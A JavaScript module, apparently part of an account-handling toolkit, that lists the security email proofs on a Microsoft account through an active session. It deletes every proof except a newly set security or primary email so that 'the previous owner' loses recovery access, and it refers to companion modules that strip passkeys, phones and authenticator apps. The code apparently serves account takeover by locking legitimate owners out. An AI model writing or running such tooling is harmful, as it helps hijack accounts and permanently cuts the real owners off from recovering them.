const { securityMethodService, SECURITY_METHOD_TYPES } = require("../secure/securityInformation");
const { normalizeEmail, isSameEmail } = require("../secure/aliasHelper");

/**
 * Removes old security email proofs that do NOT match the new security email
 * or the new primary email. This prevents the previous owner from retaining
 * recovery access via their old security email on the Microsoft account.
 *
 * Only removes EMAIL-type proofs. Passkeys, phone numbers, and authenticator
 * apps are handled by their own dedicated removal modules.
 *
 * @param {object} axios - HttpClient instance with active session
 * @param {object} options - Configuration context
 * @param {string} [options.netId] - Encrypted account net ID
 * @param {string} [options.newSecurityEmail] - The new security email to preserve (if set)
 * @param {string} [options.newPrimaryEmail] - The new primary email to preserve
 * @returns {Promise<{removed: number, kept: number, failed: number, total: number}>}
 */
module.exports = async function removeOldSecurityEmails(axios, options = {}) {
    const accountId = options.netId || options.accountId || "anonymous";
    const newSecEmail = options.newSecurityEmail ? normalizeEmail(options.newSecurityEmail) : null;
    const newPrimary = options.newPrimaryEmail ? normalizeEmail(options.newPrimaryEmail) : null;

    const result = { removed: 0, kept: 0, failed: 0, total: 0 };

    try {
        const methods = await securityMethodService.getSecurityMethods(axios, accountId);
        const emailMethods = methods.filter(m => m.type === SECURITY_METHOD_TYPES.EMAIL);

        result.total = emailMethods.length;
        console.log(`[REMOVE_OLD_SEC_EMAILS] Found ${emailMethods.length} security email proof(s).`);

        if (emailMethods.length === 0) {
            return result;
        }

        for (const method of emailMethods) {
            const proofEmail = normalizeEmail(method.displayName);

            // Preserve the new security email
            if (newSecEmail && proofEmail && isSameEmail(proofEmail, newSecEmail)) {
                console.log(`[REMOVE_OLD_SEC_EMAILS] Keeping new security email proof: ${method.id}`);
                result.kept++;
                continue;
            }

            // Preserve the new primary email (it may also appear as a security proof)
            if (newPrimary && proofEmail && isSameEmail(proofEmail, newPrimary)) {
                console.log(`[REMOVE_OLD_SEC_EMAILS] Keeping new primary email proof: ${method.id}`);
                result.kept++;
                continue;
            }

            // This is an old security email — remove it
            try {
                console.log(`[REMOVE_OLD_SEC_EMAILS] Removing old security email proof: ${method.id} (${method.displayName})`);
                const removeResult = await securityMethodService.removeSecurityMethod(
                    axios,
                    accountId,
                    method.id,
                    { authorized: true }
                );

                if (removeResult.success) {
                    result.removed++;
                    console.log(`[REMOVE_OLD_SEC_EMAILS] Successfully removed: ${method.id}`);
                } else {
                    result.failed++;
                    console.log(`[REMOVE_OLD_SEC_EMAILS] Failed to remove: ${method.id} (${removeResult.error || "unknown"})`);
                }
            } catch (remErr) {
                result.failed++;
                console.error(`[REMOVE_OLD_SEC_EMAILS] Error removing ${method.id}:`, remErr.message);
            }
        }

        console.log(`[REMOVE_OLD_SEC_EMAILS] Summary: removed=${result.removed}, kept=${result.kept}, failed=${result.failed}, total=${result.total}`);
        return result;
    } catch (err) {
        console.error("[REMOVE_OLD_SEC_EMAILS] Error:", err.message);
        return result;
    }
};
